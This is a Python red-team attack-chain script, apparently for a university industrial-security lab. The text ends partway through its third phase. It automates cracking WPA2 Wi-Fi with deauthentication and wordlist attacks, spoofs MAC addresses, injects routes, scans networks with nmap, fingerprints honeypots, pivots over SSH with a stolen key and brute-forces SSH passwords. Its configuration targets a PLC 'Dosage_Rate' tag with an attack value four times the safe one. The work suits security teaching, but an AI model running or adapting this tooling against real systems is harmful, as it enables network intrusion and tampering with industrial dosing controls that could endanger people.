#!/usr/bin/env python3


import subprocess
import sys
import os
import io
import re
import random
import threading
import time
import json
import argparse
import socket
from datetime import datetime
from dataclasses import dataclass, field
from typing import Optional


# ── Dependency bootstrap (inside venv) ───────────────────────────────────────
def _require(pkg, import_name=None):
    import importlib
    name = import_name or pkg
    try:
        return importlib.import_module(name)
    except ImportError:
        print(f"[*] Installing {pkg} into venv...")
        subprocess.run([sys.executable, "-m", "pip", "install", pkg, "-q"], check=True)
        return importlib.import_module(name)

_require("rich")
_require("paramiko")
_require("pycomm3")

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.rule import Rule
from rich.prompt import Confirm, Prompt
from rich.progress import Progress
from rich.live import Live
from rich.markup import escape
from rich.text import Text
import paramiko

console = Console()

# ── Static config — edit if your lab topology changes ────────────────────────
CFG = {
    "wifi": {
        "interface":    "wlan0",
        "monitor_iface":"wlan0",
        "ssid":         "HemoLock",
        "wordlist":     "/usr/share/wordlists/rockyou.txt",
        "capture_file": "/tmp/incs4810_capture",
    },
    "nmap": {
        "idmz_subnet":  "10.10.10.0/24",
        "ports":        "22,80,443,3000,8086,102,44818",
    },
    "historian": {
        "ip":       "10.10.10.20",
        "port":     22,
        "username": "admin",
        "password": "admin123",
    },
    "honeypot": {
        "ip": "10.10.10.50",   # Cowrie — never target directly
    },
    "ids": {
        "ip":       "10.20.20.5",   # RPi5 IDS (Zeek/Suricata) in OT zone
        "username": "admin",         # update if different from Historian
        "password": "admin123",      # update if different from Historian
        "port":     22,
    },
    "plc": {
        "ip":           "10.20.20.111",
        "type":         "Allen-Bradley / Rockwell (EtherNet/IP)",
        "tag":          "Dosage_Rate",
        "safe_value":   8,
        "attack_value": 32,
    },
    "hydra": {
        "wordlist": "/usr/share/wordlists/rockyou.txt",
        "threads":  4,
    },
}

# ── Result tracking ───────────────────────────────────────────────────────────
@dataclass
class PhaseResult:
    phase:   str
    status:  str = "pending"   # pending | success | failed | skipped
    output:  str = ""
    finding: str = ""
    ts:      str = field(default_factory=lambda: datetime.now().isoformat())


results: list[PhaseResult] = []

# ── UI helpers ────────────────────────────────────────────────────────────────

ASCII_BANNER = (
    "██╗  ██╗███████╗███╗   ███╗ ██████╗      ██╗      ██████╗  ██████╗██╗  ██╗\n"
    "██║  ██║██╔════╝████╗ ████║██╔═══██╗     ██║     ██╔═══██╗██╔════╝██║ ██╔╝\n"
    "███████║█████╗  ██╔████╔██║██║   ██║     ██║     ██║   ██║██║     █████╔╝ \n"
    "██╔══██║██╔══╝  ██║╚██╔╝██║██║   ██║     ██║     ██║   ██║██║     ██╔═██╗ \n"
    "██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝     ███████╗╚██████╔╝╚██████╗██║  ██╗\n"
    "╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝      ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n"
    "\n"
    "      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗                    \n"
    "     ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝                    \n"
    "     ███████║   ██║      ██║   ███████║██║     █████╔╝                     \n"
    "     ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗                     \n"
    "     ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗                    \n"
    "     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ V1                 \n"
)

def banner():
    console.print(f"[bold red]{ASCII_BANNER}[/bold red]")
    console.print(Panel(
        "[bold white]INCS 4810 — Red Team Attack Chain[/bold white]  "
        "[dim]|  BCIT SW01-3550  |  ISA/IEC 62443[/dim]\n"
        "[dim]Instructor: Victor Mendez  |  BCIT SW01-3550[/dim]\n"
        "[bold yellow]All actions are authorized and confined to the isolated lab network.[/bold yellow]",
        border_style="red",
        expand=False,
    ))


def phase_header(n: int, title: str):
    console.print()
    console.rule(f"[bold cyan]Phase {n}: {title}[/bold cyan]")


def ok(msg: str):
    console.print(f"[bold green] [+][/bold green] [green]{msg}[/green]")


def warn(msg: str):
    console.print(f"[bold yellow] [!][/bold yellow] [yellow]{msg}[/yellow]")


def err(msg: str):
    console.print(f"[bold red] [-][/bold red] [red]{msg}[/red]")


def info(msg: str):
    console.print(f"[bold blue] [*][/bold blue] [blue]{msg}[/blue]")


def run_cmd(cmd: str, timeout: int = 120, capture: bool = True) -> tuple[int, str]:
    """Run a shell command silently, return (returncode, stdout+stderr)."""
    console.print(f"[dim]$ {escape(cmd)}[/dim]")
    try:
        proc = subprocess.run(
            cmd, shell=True, timeout=timeout,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True
        )
        if capture:
            console.print(f"[dim]{escape(proc.stdout[-2000:])}[/dim]")
        return proc.returncode, proc.stdout
    except subprocess.TimeoutExpired:
        return -1, "TIMEOUT"


def stream_cmd(
    cmd: str,
    timeout: int = 300,
    line_filter=None,
    stop_sentinel: str | None = None,
) -> tuple[int, str]:
    """
    Stream a command's output line-by-line with live display.
    line_filter(line) -> rich markup string, or None to use dim default.
    stop_sentinel: kill the process immediately if this string appears in a line
    (used for hydra -f workaround so we don't wait for the process to flush).
    """
    console.print(f"[dim]$ {escape(cmd)}[/dim]")
    lines: list[str] = []
    start = time.monotonic()

    proc = subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1,
    )

    try:
        for raw in proc.stdout:
            line = raw.rstrip()
            if not line:
                continue
            lines.append(line)
            styled = line_filter(line) if line_filter else f"[dim]{escape(line)}[/dim]"
            console.print(styled)
            if stop_sentinel and stop_sentinel in line:
                proc.terminate()
                break
    except Exception:
        pass
    finally:
        proc.wait()

    elapsed = time.monotonic() - start
    info(f"Finished in {elapsed:.1f}s  (exit {proc.returncode})")
    return proc.returncode, "\n".join(lines)


def _nmap_filter(line: str) -> str:
    lo = line.lower()
    if "nmap scan report" in lo:
        return f"[bold cyan]{escape(line)}[/bold cyan]"
    if "/tcp" in lo and "open" in lo:
        return f"[green]{escape(line)}[/green]"
    if "host is up" in lo:
        return f"[dim green]{escape(line)}[/dim green]"
    return f"[dim]{escape(line)}[/dim]"




def ssh_connect(hostname: str, username: str, password: str, port: int = 22) -> paramiko.SSHClient:
    """Open and return an authenticated SSHClient. Raises on failure."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        hostname=hostname,
        port=port,
        username=username,
        password=password,
        timeout=15,
    )
    ok(f"SSH connected  {username}@{hostname}:{port}")
    return client


def ssh_run(client: paramiko.SSHClient, cmd: str, timeout: int = 30) -> tuple[str, str, int]:
    """Execute a command on an open SSHClient, return (stdout, stderr, exit_code)."""
    info(f"remote $ {escape(cmd)}")
    _, stdout_ch, stderr_ch = client.exec_command(cmd, timeout=timeout)
    stdout    = stdout_ch.read().decode()
    stderr    = stderr_ch.read().decode()
    exit_code = stdout_ch.channel.recv_exit_status()
    if stdout.strip():
        console.print(f"[dim]{escape(stdout.strip())}[/dim]")
    if stderr.strip():
        console.print(f"[dim red]{escape(stderr.strip())}[/dim red]")
    return stdout, stderr, exit_code


def ssh_hop(
    jump: paramiko.SSHClient,
    target_ip: str,
    target_port: int,
    target_user: str,
    target_pass: str | None = None,
    pkey: paramiko.PKey | None = None,
) -> paramiko.SSHClient:
    """
    Tunnel an SSH connection through an already-connected jump host.
    Authenticate with either a password or a stolen PKey (never both).
    Returns a fully authenticated SSHClient connected via the jump's transport.
    """
    transport = jump.get_transport()
    dest_addr  = (target_ip,  target_port)
    local_addr = (transport.getpeername()[0], 0)
    chan = transport.open_channel("direct-tcpip", dest_addr, local_addr)

    inner = paramiko.SSHClient()
    inner.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    inner.connect(
        target_ip,
        port=target_port,
        username=target_user,
        password=target_pass,
        pkey=pkey,
        sock=chan,
        timeout=15,
        allow_agent=False,
        look_for_keys=False,
    )
    auth_method = "stolen key" if pkey else "password"
    ok(f"SSH hop → {target_user}@{target_ip}:{target_port}  [{auth_method}]")
    return inner


def confirm_phase(title: str) -> bool:
    console.print()  # blank line so prompt never lands mid-output
    return Confirm.ask(f"[yellow]Run[/yellow] [bold]{title}[/bold]?", default=True)


def _resolve_wordlist(path: str) -> str | None:
    """
    Find rockyou.txt — handle gzipped version on stock Kali,
    and fall back to common alternate locations.
    """
    candidates = [
        path,
        path + ".gz",
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt.gz",
        "/opt/wordlists/rockyou.txt",
        os.path.expanduser("~/rockyou.txt"),
    ]
    for p in candidates:
        if os.path.exists(p):
            if p.endswith(".gz"):
                extracted = p[:-3]
                if not os.path.exists(extracted):
                    info(f"Extracting {p} ...")
                    run_cmd(f"sudo gunzip -k {p}", capture=False)
                return extracted if os.path.exists(extracted) else None
            return p
    return None


def _find_gateway() -> str | None:
    """Return the default gateway IP from the routing table."""
    rc, out = run_cmd("ip route show default", capture=False)
    for line in out.splitlines():
        parts = line.split()
        if "default" in parts and "via" in parts:
            return parts[parts.index("via") + 1]
    return None


def _inject_route(subnet: str, via: str):
    """Add a host route silently; ignore error if it already exists."""
    run_cmd(f"sudo ip route add {subnet} via {via} 2>/dev/null || true", capture=False)


def _probe_gateway_for_subnets(gateway: str) -> list[str]:
    """
    Send a quick nmap ping sweep through the gateway to discover
    which subnets are reachable, then infer /24 networks from live hosts.
    Works by doing a broad sweep of RFC-1918 space that the gateway routes.
    """
    info(f"Probing gateway {gateway} for reachable subnets...")
    # Sweep private ranges quickly — hosts that reply must be routable via gw
    sweep_targets = "10.0.0.0/8 172.16.0.0/12 192.168.0.0/16"
    rc, out = run_cmd(
        f"sudo nmap -T5 -n -sn -PS22,80,443,44818 --max-retries 1 "
        f"{sweep_targets} 2>/dev/null | grep 'Nmap scan report'",
        timeout=30, capture=False
    )
    found: set[str] = set()
    for line in out.splitlines():
        # "Nmap scan report for 10.10.10.20" → extract /24
        parts = line.strip().split()
        if parts:
            ip = parts[-1].strip("()")
            segments = ip.split(".")
            if len(segments) == 4:
                net = ".".join(segments[:3]) + ".0/24"
                found.add(net)
    return list(found)


def _get_local_interface() -> tuple[str, str] | tuple[None, None]:
    """
    Return (interface_name, local_subnet) for the Wi-Fi interface defined in
    CFG["wifi"]["interface"], ignoring eth0 / VMware NAT adapters entirely.
    """
    iface = CFG["wifi"]["interface"]
    _, addr_out = run_cmd(f"ip -4 route show dev {iface}", capture=False)
    for line in addr_out.splitlines():
        parts = line.split()
        if parts and "/" in parts[0] and not parts[0].startswith("default"):
            return iface, parts[0]   # e.g. ('wlan0', '192.168.10.0/24')
    return iface, None


def _candidate_gateways(local_subnet: str | None, default_gw: str | None) -> list[str]:
    """
    Build ordered gateway candidates from the wlan0 subnet only (.1, .2, .254).
    The global default gateway is appended last as a last-resort fallback.
    """
    candidates: list[str] = []

    if local_subnet:
        prefix = ".".join(local_subnet.split("/")[0].split(".")[:3])
        for last_octet in ("1", "2", "254"):
            candidates.append(f"{prefix}.{last_octet}")

    # Global default gw as fallback (may be eth0/VMware — lower priority)
    if default_gw and default_gw not in candidates:
        candidates.append(default_gw)

    return candidates


def auto_route(subnets: list[str]):
    """
    Gateway Hunter — finds the correct next-hop for each target subnet using
    active TCP probes.  Routes are bound to the Wi-Fi interface so the kernel
    never falls back to eth0 / VMware NAT.

    For each subnet:
      1. Generate gateway candidates from the wlan0 subnet (.1/.2/.254)
      2. Inject route via candidate, bound to CFG["wifi"]["interface"]
      3. TCP-probe a known host on 4 s timeout (FortiGate SYN-proxy safe)
      4. Keep route on first success; delete and try next on failure
    """
    wifi_iface           = CFG["wifi"]["interface"]
    default_gw           = _find_gateway()
    iface, local_subnet  = _get_local_interface()

    info(f"Wi-Fi interface : {iface}  subnet: {local_subnet}")
    info(f"Default gateway : {default_gw}")

    candidates = _candidate_gateways(local_subnet, default_gw)
    info(f"Gateway candidates: {candidates}")

    for subnet in subnets:
        info(f"Hunting route to {subnet}...")

        routed = False
        for gw in candidates:
            run_cmd(f"sudo ip route del {subnet} 2>/dev/null || true", capture=False)
            # Bind route to Wi-Fi interface so the kernel ignores eth0
            run_cmd(
                f"sudo ip route add {subnet} via {gw} dev {wifi_iface} 2>/dev/null || true",
                capture=False,
            )

            info(f"Testing route to {subnet} via {gw}...")
            rc, out = run_cmd(
                f"sudo nmap -sn -PS22,80,443,44818 -T5 --max-retries 1 {subnet} 2>/dev/null",
                timeout=15, capture=False,
            )
            if "Host is up" in out:
                ok(f"Route confirmed: {subnet} via [bold]{gw}[/bold] dev {wifi_iface}  "
                   f"(Live hosts detected)")
                routed = True
                break

            console.print(f"  [dim]via {gw} → no live hosts in {subnet}, trying next...[/dim]")
            run_cmd(f"sudo ip route del {subnet} 2>/dev/null || true", capture=False)

        if not routed:
            err(f"No valid route found for {subnet} — tried {candidates}. "
                f"Verify wlan0 is associated and FortiGate allows the traffic.")


def preflight_check():
    """Verify required system tools are installed before running any phase."""
    tools = ["nmap", "aircrack-ng", "airodump-ng", "besside-ng", "airmon-ng", "macchanger"]
    missing = []
    for tool in tools:
        rc, _ = run_cmd(f"which {tool}", capture=False)
        if rc != 0:
            missing.append(tool)
    if missing:
        err(f"Missing tools: {', '.join(missing)}")
        err("Install with: sudo apt-get install -y nmap aircrack-ng")
        sys.exit(1)
    ok(f"Preflight OK — all tools found: {', '.join(tools)}")
    # Routing is deferred to Phase 2 — we may not be on the target network yet.


# ── Phase implementations ─────────────────────────────────────────────────────

def _parse_airodump_csv(csv_path: str) -> list[dict]:
    """
    Parse the airodump-ng *-01.csv and return a list of AP dicts:
    {ssid, bssid, channel, power}
    Skips the client section and blank/header rows.
    """
    aps: list[dict] = []
    try:
        with open(csv_path, errors="ignore") as f:
            in_ap_section = True
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if line.startswith("Station MAC"):
                    in_ap_section = False
                    continue
                if not in_ap_section:
                    continue
                # Skip header row
                if line.startswith("BSSID"):
                    continue
                parts = [p.strip() for p in line.split(",")]
                if len(parts) < 14:
                    continue
                bssid   = parts[0]
                power   = parts[8]
                channel = parts[3]
                ssid    = parts[13]
                # Validate BSSID looks real
                if len(bssid) != 17 or bssid.count(":") != 5:
                    continue
                aps.append({
                    "bssid":   bssid,
                    "ssid":    ssid if ssid else "<hidden>",
                    "channel": channel,
                    "power":   power,
                })
    except FileNotFoundError:
        pass
    return aps


def phase1_wifi_crack() -> PhaseResult:
    phase_header(1, "WiFi AP Crack (WPA2 Handshake)")
    r = PhaseResult("WiFi Crack")

    cap   = CFG["wifi"]["capture_file"]
    iface = CFG["wifi"]["interface"]
    wl    = _resolve_wordlist(CFG["wifi"]["wordlist"])

    def _restore_managed():
        """Put the interface back into managed mode on exit."""
        info(f"Restoring {iface} to managed mode...")
        run_cmd(f"sudo ifconfig {iface} down",         capture=False)
        run_cmd(f"sudo iwconfig {iface} mode managed", capture=False)
        run_cmd(f"sudo ifconfig {iface} up",           capture=False)

    try:
        # ── MAC randomisation (OPSEC) ─────────────────────────────────────────
        ok(f"Randomising MAC address on {iface}...")
        run_cmd(f"sudo ifconfig {iface} down",    capture=False)
        run_cmd(f"sudo macchanger -r {iface}",    capture=False)

        # ── Monitor mode ──────────────────────────────────────────────────────
        ok(f"Putting {iface} into monitor mode...")
        run_cmd(f"sudo iwconfig {iface} mode monitor",  capture=False)
        run_cmd(f"sudo ifconfig {iface} up",            capture=False)

        # ── AP scan (15 s) ────────────────────────────────────────────────────
        scan_tmp = "/tmp/incs4810_scan"
        run_cmd(f"sudo rm -f {scan_tmp}*", capture=False)   # clean stale scan files
        console.print()
        info("Scanning for access points — 15 s, please wait...")
        run_cmd(
            f"sudo timeout 15 airodump-ng --output-format csv -w {scan_tmp} {iface} 2>/dev/null",
            timeout=20, capture=False,
        )

        aps = _parse_airodump_csv(f"{scan_tmp}-01.csv")
        if not aps:
            err("No APs found — check that the interface name in CFG is correct")
            r.status  = "failed"
            r.finding = "AP scan returned no results"
            return r

        # ── AP selection table ────────────────────────────────────────────────
        ap_table = Table(
            title="[bold magenta]Discovered Access Points[/bold magenta]",
            show_header=True, header_style="bold cyan", border_style="dim",
        )
        ap_table.add_column("#",       style="dim",    width=4)
        ap_table.add_column("SSID",    style="green",  width=26)
        ap_table.add_column("BSSID",   style="yellow", width=20)
        ap_table.add_column("CH",      style="cyan",   width=5)
        ap_table.add_column("Power",   style="white",  width=8)
        for i, ap in enumerate(aps, 1):
            ap_table.add_row(str(i), ap["ssid"], ap["bssid"],
                             ap["channel"].strip(), ap["power"].strip())
        console.print(ap_table)
        console.print("[dim]  Enter the number of the target AP, or [bold]q[/bold] to skip Phase 1[/dim]")
        console.print()

        raw = Prompt.ask(f"[yellow]Target AP #[/yellow]").strip().lower()
        if raw == "q":
            r.status  = "skipped"
            r.finding = "Skipped by operator"
            return r
        try:
            chosen = aps[int(raw) - 1]
        except (ValueError, IndexError):
            err(f"'{raw}' is not a valid choice")
            r.status  = "failed"
            r.finding = "No AP selected"
            return r

        bssid   = chosen["bssid"]
        channel = chosen["channel"].strip()
        console.print()
        ok(f"Target locked: [bold green]{chosen['ssid']}[/bold green]  "
           f"BSSID=[bold]{bssid}[/bold]  CH={channel}")

        # ── Handshake capture + crack loop ────────────────────────────────────
        while True:
            # sudo rm clears files owned by root; glob+os.remove fails silently
            run_cmd(f"sudo rm -f {cap}*", capture=False)

            console.print()
            console.print(Panel(
                f"[bold white]Interface :[/bold white] {iface}\n"
                f"[bold white]Target    :[/bold white] {chosen['ssid']}  ({bssid})\n"
                f"[bold white]Channel   :[/bold white] {channel}\n"
                f"[bold white]Duration  :[/bold white] 90 s\n"
                f"[bold white]Method    :[/bold white] [green]besside-ng (targeted deauth)[/green]",
                title="[bold cyan] Capturing Handshake [/bold cyan]",
                border_style="cyan", expand=False,
            ))

            run_cmd("sudo rm -f ./wpa.cap ./wepe.cap ./besside.log ./cracked.txt", capture=False)

            # Targeted besside-ng — -b restricts attack to our BSSID only
            run_cmd(f"sudo besside-ng -b {bssid} {iface}", timeout=90)

            wl_arg = wl if wl else "/usr/share/wordlists/rockyou.txt"

            found_password = ""

            if not os.path.exists("./wpa.cap"):
                warn("No wpa.cap created — besside-ng may have lost monitor mode")
            else:
                ok("wpa.cap found — cracking with aircrack-ng...")
                run_cmd(
                    f"sudo aircrack-ng ./wpa.cap -w {wl_arg} -l cracked.txt",
                    timeout=60,
                )

                # Read the password aircrack-ng wrote to cracked.txt
                if os.path.exists("./cracked.txt"):
                    with open("./cracked.txt", "r", errors="ignore") as f:
                        found_password = f.read().strip()

                # Fallback: scan stdout for KEY FOUND line
                if not found_password:
                    rc2, out2 = run_cmd(
                        f"sudo aircrack-ng ./wpa.cap -w {wl_arg}", timeout=60
                    )
                    clean_out = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", out2)
                    match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", clean_out)
                    if match:
                        found_password = match.group(1).strip()

            if found_password:
                r.status  = "success"
                r.finding = f"KEY FOUND! [ {found_password} ]"
                ok(r.finding)

                # Restore managed mode before nmcli tries to associate
                _restore_managed()

                ssid = chosen["ssid"]
                ok(f"Connecting to [bold]{ssid}[/bold] via NetworkManager...")
                # Delete stale profile, create a fresh WPA-PSK one, then bring it up.
                # Explicit key-mgmt avoids the "property is missing" NM error that
                # occurs when NM can't auto-detect security after monitor mode.
                run_cmd(f"sudo nmcli con delete '{ssid}' 2>/dev/null || true",
                        capture=False)
                run_cmd(
                    f"sudo nmcli con add type wifi ifname {iface} "
                    f"con-name '{ssid}' ssid '{ssid}' -- "
                    f"wifi-sec.key-mgmt wpa-psk wifi-sec.psk '{found_password}'",
                    capture=True,
                )
                run_cmd(f"sudo nmcli con up '{ssid}'", capture=True)
                info("Waiting 5 s for DHCP lease...")
                time.sleep(5)
                ok(f"{iface} should now have an IP on the target network")
                return r

            warn("aircrack-ng did not find the key")
            console.print()
            if not Confirm.ask(
                "[yellow]Retry besside-ng capture on this AP?[/yellow]", default=True
            ):
                break

        r.status  = "failed"
        r.finding = "Handshake not cracked — try a longer capture or bigger wordlist"
        err(r.finding)

    finally:
        _restore_managed()

    return r


def _parse_nmap_hosts(nmap_output: str) -> dict[str, list[str]]:
    """
    Parse nmap output and return {ip: [open_port, ...]} for every host
    that has at least one genuinely open port.
    """
    hosts: dict[str, list[str]] = {}
    current_ip: str | None = None
    for line in nmap_output.splitlines():
        # "Nmap scan report for 10.10.10.20"
        m = re.search(r"Nmap scan report for (\S+)", line)
        if m:
            current_ip = m.group(1).strip("()")
            hosts.setdefault(current_ip, [])
            continue
        # "22/tcp   open  ssh"
        if current_ip and "/tcp" in line and "open" in line:
            port = line.split("/")[0].strip()
            hosts[current_ip].append(port)
    # Drop hosts with no open ports
    return {ip: ports for ip, ports in hosts.items() if ports}


def _detect_cowrie(ip: str, port: int = 22) -> bool:
    """
    Active Cowrie honeypot fingerprinter.

    A real SSH server raises AuthenticationException for garbage credentials.
    Cowrie (and other deception systems) accept any login to trap the attacker.

    Returns True  → honeypot (accepted our fake creds — DO NOT trust this host).
    Returns False → real server (rejected creds, timed-out, or refused connection).
    """
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            hostname=ip, port=port,
            username="fake_hunter99",
            password="FakePassw0rd!@#88",
            timeout=3,
            banner_timeout=3,
            allow_agent=False,
            look_for_keys=False,
        )
        # If we reach here the server accepted garbage creds — it's a honeypot
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False   # real server — correctly rejected us
    except Exception:
        return False   # timeout, refused, etc. — treat as real/unknown


def phase2_idmz_recon() -> PhaseResult:
    phase_header(2, "IDMZ Recon (autonomous)")
    r = PhaseResult("IDMZ Recon")

    ports = CFG["nmap"]["ports"]

    # ── Step 1: discover gateway and reachable subnets dynamically ────────────
    info("Discovering Wi-Fi gateway...")
    gateway = _find_gateway()
    if not gateway:
        r.status  = "failed"
        r.finding = "No default gateway found — is wlan0 associated?"
        err(r.finding)
        return r
    ok(f"Gateway: {gateway}")

    info("Probing gateway for reachable subnets...")
    discovered_subnets = _probe_gateway_for_subnets(gateway)
    if not discovered_subnets:
        warn("Subnet probe returned nothing — falling back to CFG idmz_subnet")
        discovered_subnets = [CFG["nmap"]["idmz_subnet"]]
    else:
        ok(f"Discovered subnets: {', '.join(discovered_subnets)}")

    # ── Step 2: inject routes for every discovered subnet ─────────────────────
    info("Injecting routes for all discovered subnets...")
    auto_route(discovered_subnets)

    # ── Step 3: nmap sweep across all discovered subnets ─────────────────────
    all_nmap_out = ""
    live_hosts: dict[str, list[str]] = {}

    for subnet in discovered_subnets:
        nmap_cmd = f"sudo nmap -T4 -n -sS -Pn -p {ports} --open {subnet}"
        info(f"Sweeping {subnet}  ports {ports}")
        rc, out  = stream_cmd(nmap_cmd, timeout=120, line_filter=_nmap_filter)
        all_nmap_out += out
        hosts = _parse_nmap_hosts(out)
        live_hosts.update(hosts)

    if not live_hosts:
        r.status  = "failed"
        r.finding = "No hosts with open ports found across discovered subnets"
        err(r.finding)
        r.output  = all_nmap_out[-2000:]
        return r

    # ── Step 4: active Cowrie fingerprinting on every SSH-speaking host ───────
    info("Fingerprinting SSH hosts for Cowrie honeypot signatures...")
    cowrie_flags: dict[str, bool] = {}
    for ip, open_ports in live_hosts.items():
        if "22" in open_ports:
            info(f"  Testing {ip}:22 with fake credentials...")
            is_trap = _detect_cowrie(ip, port=22)
            cowrie_flags[ip] = is_trap
            if is_trap:
                warn(f"  [TRAP] {ip} accepted garbage creds — Cowrie honeypot confirmed!")
            else:
                ok(f"  {ip} rejected fake creds — real SSH server")

    # ── Step 5: display results (honeypots flagged, not hidden) ───────────────
    host_table = Table(
        title="[bold magenta]Discovered Live Hosts[/bold magenta]",
        show_header=True, header_style="bold cyan", border_style="dim",
    )
    host_table.add_column("#",          style="dim",    width=4)
    host_table.add_column("IP Address", style="green",  width=18)
    host_table.add_column("Open Ports", style="yellow", width=52)

    host_list = list(live_hosts.items())
    for i, (ip, open_ports) in enumerate(host_list, 1):
        ports_str = ", ".join(open_ports)
        if cowrie_flags.get(ip):
            ports_str += "  [bold red]\[TRAP: Cowrie Honeypot][/bold red]"
        host_table.add_row(str(i), ip, ports_str)

    console.print(host_table)
    console.print(
        "[dim]  Honeypots are visible but flagged — "
        "select the real Historian (port 22, not a trap).  "
        "[bold]q[/bold] = abort[/dim]"
    )
    console.print()

    raw = Prompt.ask(f"[yellow]Select Historian IP # (1–{len(host_list)})[/yellow]").strip().lower()
    if raw == "q":
        r.status  = "skipped"
        r.finding = "Skipped by operator"
        return r
    try:
        chosen_ip, chosen_ports = host_list[int(raw) - 1]
    except (ValueError, IndexError):
        r.status  = "failed"
        r.finding = "Invalid selection"
        err(r.finding)
        return r

    if cowrie_flags.get(chosen_ip):
        warn(f"WARNING: {chosen_ip} is a confirmed Cowrie honeypot — selection noted")

    CFG["historian"]["ip"] = chosen_ip
    ok(f"Historian set to [bold]{chosen_ip}[/bold]  (open ports: {', '.join(chosen_ports)})")

    trap_count = sum(1 for v in cowrie_flags.values() if v)
    r.status  = "success"
    r.finding = (
        f"Historian: {chosen_ip}  |  "
        f"{len(live_hosts)} hosts found across {len(discovered_subnets)} subnets  |  "
        f"{trap_count} honeypot(s) flagged"
    )
    r.output  = all_nmap_out[-2000:]
    return r


def _tcp_reachable(ip: str, port: int, timeout: float = 1.0) -> bool:
    """Quick socket test — returns True if TCP port is open and accepting."""
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False



def _ssh_bruteforce(
    ip: str,
    port: int,
    username: str,
    wordlist_path: str,
    delay: float = 0.2,
) -> str | None:
    """
    Sequential paramiko SSH brute forcer with rich Progress bar.
    - AuthenticationException  → wrong password, skip
    - SSHException              → possible rate-limit, wait 1s and retry same password
    - timeout / connection err  → abort after 3 consecutive failures
    """
    priority = ["", username, username[::-1], f"{username}123", "password", "admin123"]

    try:
        with open(wordlist_path, errors="ignore") as f:
            wordlist = [line.strip() for line in f if line.strip()]
    except (FileNotFoundError, OSError):
        wordlist = []

    candidates = list(dict.fromkeys(priority + wordlist))  # ordered dedup
    total = len(candidates)
    MAX_CONSECUTIVE_TIMEOUTS = 3

    consecutive_timeouts = 0
    found_password: str | None = None

    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TaskProgressColumn, TimeElapsedColumn

    with Progress(
        SpinnerColumn(),
        TextColumn("[bold cyan]{task.description}"),
        BarColumn(bar_width=28),
        TaskProgressColumn(),
        TimeElapsedColumn(),
        console=console,
        transient=False,
    ) as progress:
        task = progress.add_task(
            f"Attempting {username}@{ip}", total=total
        )

        for pw in candidates:
            if progress.finished:
                break

            progress.update(
                task,
                description=f"[bold cyan]Attempting: {username}@{ip}  password: {pw}[/bold cyan]",
            )

            retry = True
            while retry:
                retry = False
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(
                        hostname=ip,
                        username=username,
                        password=pw,
                        timeout=3,
                        allow_agent=False,
                        look_for_keys=False,
                        banner_timeout=3,
                    )
                    client.close()
                    consecutive_timeouts = 0
                    found_password = pw
                    progress.update(task, completed=total,
                                    description=f"[bold green]FOUND: {username}@{ip}  password: {pw}[/bold green]")
                    break  # exit while

                except paramiko.AuthenticationException:
                    # Wrong password — clean rejection, move on
                    consecutive_timeouts = 0
                    time.sleep(delay)

                except paramiko.SSHException:
                    # Possible rate-limit on Historian — wait 1s and retry same pw
                    progress.update(task,
                        description=f"[yellow]SSHException (rate-limit?) — retrying {pw} in 1s[/yellow]")
                    time.sleep(1)
                    retry = True

                except (socket.timeout, paramiko.ssh_exception.NoValidConnectionsError, OSError):
                    consecutive_timeouts += 1
                    progress.update(task,
                        description=f"[yellow]Timeout {consecutive_timeouts}/{MAX_CONSECUTIVE_TIMEOUTS} on {ip}:{port}[/yellow]")
                    if consecutive_timeouts >= MAX_CONSECUTIVE_TIMEOUTS:
                        progress.update(task,
                            description=f"[red]Network blocked — aborting[/red]")
                        return None
                    time.sleep(1)

            if found_password is not None:
                break
            progress.advance(task)

    return found_password


def phase3_ssh_bruteforce() -> PhaseResult:
    phase_header(3, "SSH Brute Force on Historian (paramiko)")
    r = PhaseResult("SSH Brute Force")

    ip   = CFG["historian"]["ip"]
    port = CFG["historian"]["port"]
    user = CFG["historian"]["username"]
    wl   = _resolve_wordlist(CFG["hydra"]["wordlist"])

    console.print(Panel(
        f"[bold white]Target   :[/bold white] [bold yellow]{user}@{ip}:{port}[/bold yellow]\n"
        f"[bold white]Wordlist :[/bold white] {wl or 'priority list only'}",
        title="[bold white] SSH BRUTE FORCE INITIATED [/bold white]",
        border_style="red",
        expand=False,
        padding=(1, 4),
    ))

    # ── Fail-fast: retry TCP probe up to 3× — FortiGate SYN-proxy safe ───────
    MAX_PROBE_ATTEMPTS = 3
    for attempt in range(1, MAX_PROBE_ATTEMPTS + 1):
        info(f"TCP probe attempt {attempt}/{MAX_PROBE_ATTEMPTS} → {ip}:{port}  (4 s timeout)")
        if _tcp_reachable(ip=ip, port=port, timeout=4.0):
            ok(f"Port {port} open on {ip} — starting brute force")
            break
        warn(f"Attempt {attempt} timed out")
        if attempt < MAX_PROBE_ATTEMPTS:
            time.sleep(2)
    else:
        r.status  = "failed"
        r.finding = f"Target unreachable — {ip}:{port} timed out after {MAX_PROBE_ATTEMPTS} attempts"
        err(r.finding)
        return r

    if not wl:
        warn("rockyou.txt not found — running priority-list only")
        wl = "/dev/null"
    else:
